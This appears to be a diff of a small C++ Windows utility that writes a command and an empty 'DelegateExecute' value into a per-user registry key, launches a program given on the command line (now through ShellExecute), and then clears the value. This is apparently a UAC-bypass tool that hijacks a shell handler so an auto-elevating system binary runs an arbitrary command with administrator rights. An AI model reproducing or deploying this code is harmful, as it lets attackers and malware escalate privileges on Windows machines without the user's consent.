@@ -2,7 +2,7 @@
 #include <string>
 using namespace std;
 // Author:Vahab Programmer https://github.com\Vahab-Programmer
-// Version: 0.0.1
+// Version: 0.0.2
 void setreg(const char addr[],const char value[],const char name[]){
     HKEY key;
     RegCreateKey(HKEY_CURRENT_USER,addr,NULL);
@@ -20,8 +20,10 @@ int main(int argc,char **argv){
         exec =exec + " ";
     };
     string command=base+exec;
+    string cmd=base;
+    cmd+=argv[1];
     setreg(ra,"","DelegateExecute");
     setreg(ra,command.c_str(),"");
-    system(argv[1]);
+    ShellExecute(NULL,"open",argv[1],NULL,NULL,SW_SHOWNORMAL);
     setreg(ra,"","");
 }
